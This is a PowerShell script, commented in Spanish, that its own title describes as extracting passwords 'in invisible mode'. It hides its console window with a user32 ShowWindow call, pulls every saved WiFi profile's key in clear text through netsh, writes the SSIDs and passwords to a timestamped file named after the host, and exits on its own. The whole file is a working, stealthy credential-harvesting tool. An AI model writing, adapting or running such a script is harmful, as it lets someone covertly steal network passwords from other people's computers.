# Script para extraer contrasenias modo invisible jiji

# Ocultar ventana de PowerShell de forma segura
try {
    Add-Type -Name User32 -Namespace Win32Api -MemberDefinition @"
[DllImport("user32.dll")]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
"@
    
    # Obtener solo el proceso actual de PowerShell
    $currentProcess = Get-Process -Id $PID
    $hwnd = $currentProcess.MainWindowHandle
    
    # Ocultar la ventana si tiene un manejador válido
    if ($hwnd -ne [IntPtr]::Zero) {
        [Win32Api.User32]::ShowWindow($hwnd, 0)
    }
} catch {
    # Si falla ocultar la ventana, continuamos igual
}

# Configuración
$outputPath = "$PSScriptRoot\wifi_data"
if (-not (Test-Path $outputPath)) { 
    [System.IO.Directory]::CreateDirectory($outputPath) | Out-Null
}

$outputFile = "$outputPath\wifi_$(hostname)_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"

# Cabecera del archivo
"=====================================================" | Out-File $outputFile
"Contraseñas WiFi Extraidas - $(hostname)" | Out-File $outputFile -Append
"Fecha: $(Get-Date)" | Out-File $outputFile -Append
"=====================================================" | Out-File $outputFile -Append
"" | Out-File $outputFile -Append

# Extraer contraseñas
try {
    $profiles = (netsh wlan show profiles) | Select-String ":" | ForEach-Object { 
        $_.ToString().Split(':')[1].Trim() 
    }
    
    foreach ($profile in $profiles) {
        try {
            $profileData = netsh wlan show profile name="$profile" key=clear 2>$null
            $passwordLine = $profileData | Select-String "Contenido de la clave"
            
            if ($passwordLine) {
                $password = $passwordLine.ToString().Split(':')[1].Trim()
                "SSID: $profile" | Out-File $outputFile -Append
                "Password: $password" | Out-File $outputFile -Append
            } else {
                "SSID: $profile (sin contraseña guardada)" | Out-File $outputFile -Append
            }
            "----------------------------------------" | Out-File $outputFile -Append
        } catch {
            "SSID: $profile (error al acceder)" | Out-File $outputFile -Append
            "----------------------------------------" | Out-File $outputFile -Append
        }
    }
} catch {
    "Error al obtener perfiles WiFi" | Out-File $outputFile -Append
}

# Cerrar automáticamente después de 3 segundos
Start-Sleep -Seconds 3
exit